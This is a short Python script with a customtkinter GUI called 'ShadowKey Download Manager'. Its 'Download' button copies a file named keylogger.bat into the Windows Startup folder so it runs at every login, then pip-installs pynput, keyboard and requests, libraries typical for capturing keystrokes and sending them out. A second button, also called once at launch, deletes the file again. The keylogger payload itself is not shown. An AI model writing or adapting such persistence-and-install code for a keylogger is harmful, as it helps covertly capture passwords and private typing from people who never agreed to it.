from customtkinter import*
import os
import shutil
import subprocess


def download():
    # Define the source file path
    source_file = "D:\keylogger.bat"  # Update this with the actual path if necessary

    # Determine the destination directory
    app_data_dir = os.getenv("APPDATA")
    startup_dir = os.path.join(app_data_dir, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    # Check if the source file exists
    if os.path.exists(source_file):
        # Copy the file to the Startup directory
        shutil.copy(source_file, startup_dir)

        # Install required modules
        try:
            subprocess.run(["pip", "install", "requests"])
            subprocess.run(["pip", "install", "pynput"])
            subprocess.run(["pip", "install", "keyboard"])
            print("Modules installed successfully.")
        except Exception as e:
            print(f"Error installing modules: {e}")
    else:
        print("Error: The source file keylogger.bat does not exist.")

def remove_keylogger():
    # Determine the destination directory
    app_data_dir = os.getenv("APPDATA")
    startup_dir = os.path.join(app_data_dir, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    # Define the file to be removed
    file_to_remove = os.path.join(startup_dir, "keylogger.bat")

    # Check if the file exists in the startup directory
    if os.path.exists(file_to_remove):
        # Attempt to remove the file
        try:
            os.remove(file_to_remove)
            print("keylogger.bat has been successfully removed from the Startup directory.")
        except Exception as e:
            print(f"Error: {e}")
    else:
        print("Error: The file keylogger.bat does not exist in the Startup directory.")


# Call the function to remove the keylogger.bat file from the Startup directory
remove_keylogger()


app = CTk()

app.geometry('300x300')

app.title('ShadowKey Download Manager')

label = CTkLabel(app, text='ShadowKey Developed by Deccatron')
label.place(relx=0.5, rely=0.35, anchor='center')

button = CTkButton(app, text="Download", corner_radius=22, fg_color="#2234A8",
                   command=download)
button.place(relx=0.5, rely=0.5, anchor='center')

button = CTkButton(app, text="Remove files", corner_radius=22, fg_color="#301934",
                   command=remove_keylogger)
button.place(relx=0.5, rely=0.65, anchor='center')

app.mainloop()